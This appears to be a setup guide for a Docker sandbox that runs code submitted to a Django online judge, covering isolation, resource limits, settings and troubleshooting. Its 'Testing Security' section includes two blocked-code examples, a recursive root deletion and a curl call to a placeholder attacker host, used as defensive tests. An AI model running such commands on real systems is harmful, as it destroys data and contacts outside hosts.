# Secure Code Execution Setup

This document explains how to set up the secure code execution environment for your Django online judge platform.

## Security Features

Your code execution system now includes the following security measures:

### 🔒 Container Isolation
- Each code submission runs in a separate Docker container
- Complete filesystem isolation from the host system
- No access to host files, networks, or resources

### 🚫 Network Isolation
- Containers have no network access (`network_mode='none'`)
- Cannot make HTTP requests or connect to external services
- Prevents data exfiltration and malicious downloads

### ⚡ Resource Limits
- **Memory**: 128MB-512MB depending on language
- **CPU**: Limited to 50% of one CPU core
- **Time**: 5-10 seconds execution timeout
- **Processes**: Maximum 50 processes per container
- **File Descriptors**: Limited to 64 open files
- **File Size**: Maximum 10MB file size limit

### 👤 User Security
- Code runs as non-root user `sandbox`
- No privilege escalation possible
- Read-only filesystem (except small temp directory)

### 🛡️ Code Validation
- Scans for dangerous imports and system calls
- Blocks common attack patterns
- File size validation
- Output size limits

## Setup Instructions

### Prerequisites
1. Docker must be installed and running
2. Python packages: `docker` library

Install Docker Python library:
```bash
pip install docker
```

### Quick Setup

#### On Windows:
```cmd
cd C:\Users\ASUS\django-project
scripts\setup-judge.bat
```

#### On Linux/Mac:
```bash
cd /path/to/django-project
chmod +x scripts/setup-judge.sh
./scripts/setup-judge.sh
```

### Manual Setup

1. **Build Docker Images**:
```bash
docker build -t django-judge-python ./docker/python/
docker build -t django-judge-cpp ./docker/cpp/
docker build -t django-judge-java ./docker/java/
docker build -t django-judge-javascript ./docker/javascript/
```

2. **Verify Images**:
```bash
docker images | grep django-judge
```

3. **Test Security**:
Try submitting code with dangerous patterns to verify they're blocked.

## Django Settings

Add these settings to your Django `settings.py`:

```python
# Judge Security Settings
JUDGE_SECURE_EXECUTION = True  # Enable Docker-based execution
JUDGE_MAX_FILE_SIZE = "10m"    # Maximum code file size
JUDGE_MAX_OUTPUT_SIZE = "1m"   # Maximum output size
JUDGE_DEFAULT_TIME_LIMIT = 5   # Default timeout in seconds
JUDGE_DEFAULT_MEMORY_LIMIT = "128m"  # Default memory limit

# Supported languages
JUDGE_SUPPORTED_LANGUAGES = ['python', 'py', 'cpp', 'java', 'javascript']
```

## How It Works

1. **Code Submission**: User submits code through Django form
2. **Security Validation**: Code is scanned for dangerous patterns
3. **Container Creation**: Fresh Docker container is created
4. **Resource Limits**: Strict CPU, memory, and time limits applied
5. **Isolation**: No network, limited filesystem access
6. **Execution**: Code runs in sandbox with test input
7. **Cleanup**: Container is destroyed after execution

## Supported Languages

| Language   | Runtime        | Memory Limit | Compile Time |
|------------|----------------|--------------|--------------|
| Python     | Python 3.11    | 256MB        | N/A          |
| C++        | GCC 11         | 128MB        | 15s          |
| Java       | OpenJDK 17     | 512MB        | 20s          |
| JavaScript | Node.js 18     | 256MB        | N/A          |

## Troubleshooting

### Docker Not Found
```
Error: Docker is not installed
```
**Solution**: Install Docker Desktop or Docker Engine

### Permission Denied
```
docker: permission denied
```
**Solution**: Add user to docker group or run with sudo

### Images Not Building
```
Error building image
```
**Solution**: Check Dockerfile syntax and Docker daemon status

### Legacy Execution Warning
```
Using UNSAFE legacy execution
```
**Solution**: Ensure Docker is running and images are built

## Testing Security

Test that dangerous code is blocked:

```python
# This should be blocked
import os
os.system("rm -rf /")
```

```python
# This should be blocked
import subprocess
subprocess.call(["curl", "evil-site.com"])
```

## Monitoring

Check judge system status:
```python
from submit.judge import judge
status = judge.check_system_requirements()
print(status)
```

Expected output with security enabled:
```python
{
    'docker_available': True,
    'images': {
        'python': True,
        'cpp': True, 
        'java': True,
        'javascript': True
    }
}
```

## Security Considerations

⚠️ **Important**: Even with these security measures:

1. Keep Docker updated
2. Monitor resource usage
3. Regularly review logs
4. Consider additional layers like AppArmor/SELinux
5. Run on isolated servers for production

## Production Recommendations

For production deployment:

1. Use separate server for judge system
2. Enable Docker content trust
3. Implement rate limiting
4. Add comprehensive logging
5. Regular security audits
6. Container registry scanning